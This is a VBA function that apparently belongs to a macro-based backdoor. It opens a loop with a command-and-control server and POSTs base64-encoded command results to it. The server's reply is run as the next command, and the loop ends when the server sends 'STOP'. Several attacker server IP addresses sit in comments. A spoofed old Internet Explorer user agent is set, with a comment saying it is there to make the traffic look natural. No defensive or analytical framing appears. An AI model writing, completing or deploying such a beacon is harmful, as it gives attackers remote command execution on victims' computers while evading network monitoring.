Function SendtoServer(Url As String)
    Dim replyTXT As String
    Dim Data As String
    Dim en_Data As String
    
    Data = "START"
    
    'start loop of the receive + run new commands, stop the session when recived "STOP" command
    Do While replyTXT <> "STOP"
        
        'Send command result to server, similar to SendtoServer
        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
        objHTTP.SetTimeouts 1000000, 1000000, 1000000, 1000000
        'set the c2 IP and Port
        'Url = "http://10.25.0.23:80"
        'khong co mang
        'Url = "http://172.22.208.1:80"
        'Url = "http://160.216.17.236:80"
        'Url = "http://10.25.0.23:80"
        'Url = "http://192.168.0.101:80"
        'send the data as POST request
        objHTTP.Open "POST", Url, False
        
        'set user agent to look more like natural traffic
        objHTTP.SetRequestHeader "User-Agent", "Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.0)"
        
        'send the data enscrypt
        en_Data = EncodeBase64(Data)
        objHTTP.Send (en_Data)
        
        'Test Response
        'MsgBox objHTTP.ResponseText
        
        'recieve the new command from the respone
        replyTXT = objHTTP.ResponseText

        'run the new command
        Data = RunCommand(replyTXT)
        
    'continue with the loop of recieve-run new commands
    Loop
Done:
    Exit Function
        
End Function